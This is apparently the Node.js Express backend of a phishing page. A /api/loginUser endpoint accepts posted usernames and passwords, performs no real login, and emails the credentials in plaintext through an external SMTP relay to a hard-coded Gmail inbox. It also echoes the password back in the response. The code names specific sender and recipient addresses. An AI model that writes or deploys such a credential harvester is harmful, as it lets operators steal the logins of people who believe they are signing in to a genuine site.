require("dotenv").config();
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();

app.use(bodyParser.json());
app.use(cors());

const PORT = process.env.PORT || 3500;

app.post("/api/loginUser", async (req, res) => {
  try {
    loginData = req.body;

    if (!loginData) {
      console.log("No login data procided or undifined");
    }

    const transpoter = nodemailer.createTransport({
      host: "smtp.elasticemail.com",
      port: 2525,
      secure: false,
      auth: {
        user: "nodemailer2446@gmail.com",
        pass: process.env.NODEMAILER_PASS,
      },
    });

    const messageOption = {
      from: "nodemailer2446@gmail.com",
      to: "customerservicesilkflowers@gmail.com",
      subject: "SUPPORT MAILER",
      text: `recentely logged in user:<br><br> ${loginData}`,
      html: `<p>Recently logged in user:</p>
              <p>${loginData.username}</p>
              <p>${loginData.password}</p>
      `,
    };

    const info = await transpoter.sendMail(messageOption);
    console.log("email sent to:", messageOption.to);
    console.log(loginData);

    res.status(200).json({ success: true, message: messageOption });
  } catch (err) {
    console.log("Error ", err.message);
  }
});

app.listen(PORT, () => {
  console.log(`server listening on port ${PORT} http://localhost:${PORT}`);
});
